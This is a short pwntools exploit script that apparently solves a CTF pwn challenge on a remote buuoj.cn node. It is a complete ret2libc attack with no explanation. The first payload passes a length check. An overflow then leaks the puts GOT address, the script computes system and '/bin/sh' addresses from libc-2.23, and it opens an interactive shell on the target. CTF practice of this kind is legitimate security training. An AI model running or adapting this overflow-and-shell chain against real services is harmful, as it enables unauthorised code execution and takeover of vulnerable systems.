from pwn import *
from LibcSearcher import *
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")
#sh=process("./timu")
sh=remote("node4.buuoj.cn",26933)

puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=0x08048825

payload=b'\x00'+b'aaaaaa'+b'\xff'+b'\xff'+b'\xff'+b'\xff'+b'\xff'
sh.sendline(payload)
payload1=0xEB*b'a'+p32(puts_plt)+p32(main_addr)+p32(puts_got)
sh.recv()
sh.sendline(payload1)
puts_addr=u32(sh.recv(4))

#libc=LibcSearcher("puts",puts_addr)
#libc_base=puts_addr-libc.dump("puts")
#system_addr=libc_base+libc.dump("system")
#bin_sh=libc_base+libc.dump("str_bin_sh")

offset = puts_addr - libc.sym['puts']
system_addr=offset+libc.sym['system']
bin_sh=offset+next(libc.search(b'/bin/sh'))

sh.sendline(payload)
sh.recv()
payload2=0xEB*b'a'+p32(system_addr)+p32(0xdeadbeef)+p32(bin_sh)
sh.sendline(payload2)
sh.interactive()
